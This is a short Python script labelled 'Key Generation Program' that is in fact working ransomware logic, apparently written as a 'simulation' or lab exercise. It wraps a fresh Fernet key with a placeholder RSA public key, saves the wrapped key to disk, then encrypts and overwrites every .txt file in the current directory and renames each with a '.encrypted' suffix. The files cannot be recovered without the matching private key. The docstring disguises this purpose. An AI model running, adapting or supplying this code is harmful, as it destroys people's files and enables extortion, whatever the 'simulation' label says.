'''
Key Generation Program
'''

import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet

# ===========================
#  PUT enc.key CONTENT HERE
# ===========================
PUBLIC_KEY_DATA = b"""
-----BEGIN PUBLIC KEY-----
#  PUT enc.key CONTENT HERE
-----END PUBLIC KEY-----
"""

def main():
    # Load public key
    public_key = serialization.load_pem_public_key(PUBLIC_KEY_DATA)

    # Generate symmetric key
    shared_key = Fernet.generate_key()

    # Encrypt shared key using RSA public key
    encrypted_shared_key = public_key.encrypt(
        shared_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save encrypted shared key
    with open("EncryptedSharedKey", "wb") as f:
        f.write(encrypted_shared_key)

    fernet = Fernet(shared_key)

    # Encrypt all .txt files
    for filename in os.listdir("."):
        if filename.endswith(".txt"):
            with open(filename, "rb") as f:
                data = f.read()

            encrypted_data = fernet.encrypt(data)

            # overwrite original file
            with open(filename, "wb") as f:
                f.write(encrypted_data)

            # rename
            os.rename(filename, filename + ".encrypted")

    print("Ransomware simulation completed.")

if __name__ == "__main__":
    main()
